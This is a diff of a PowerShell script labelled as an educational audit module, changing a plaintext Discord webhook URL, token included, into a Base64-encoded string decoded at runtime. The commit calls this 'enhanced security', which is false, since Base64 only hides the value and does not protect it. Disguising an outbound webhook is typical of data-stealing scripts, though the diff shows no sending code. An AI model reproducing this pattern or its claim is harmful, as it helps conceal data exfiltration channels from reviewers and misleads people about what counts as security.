@@ -1,15 +1,16 @@
 # ==============================================================================
 # AUDIT SCRIPT - EDUCATIONAL MODULE
-# Version: 2.3.9
-# Fix: Raw Webhook URI migration for diagnostic testing
+# Version: 2.4.0
+# Fix: Implemented Base64 encoded Webhook URI for enhanced security
 # ==============================================================================
 
 # ========== CONFIGURATION ==========
 $VerboseMode = $true
-$AuditVersion = '2.3.9'
+$AuditVersion = '2.4.0'
 
-# Discord Webhook URI (Raw for testing)
-$Channel_URI = 'https://discord.com/api/webhooks/1515542439556022323/p7a7o-Qx2eiG3w6vcnku_Kj6qKMMusv0kvycUIfON-zWVQczhbuuBPYc0z_v-dX6p2Ha'
+# Discord Webhook URI (Base64 Encoded)
+$B64_Channel = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxNTU0MjQzOTU1NjAyMjMyMy9wN2E3by1ReDJlaUczdzZ2Y25rdV9LajZxS01NdXN2MGt2eWNVSWZPTi16V1ZRY3poYnV1QlBZYzB6X3YtZFg2cDJIYQ=='
+$Channel_URI = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($B64_Channel))
 
 # ========== CORE UTILITIES ==========
 
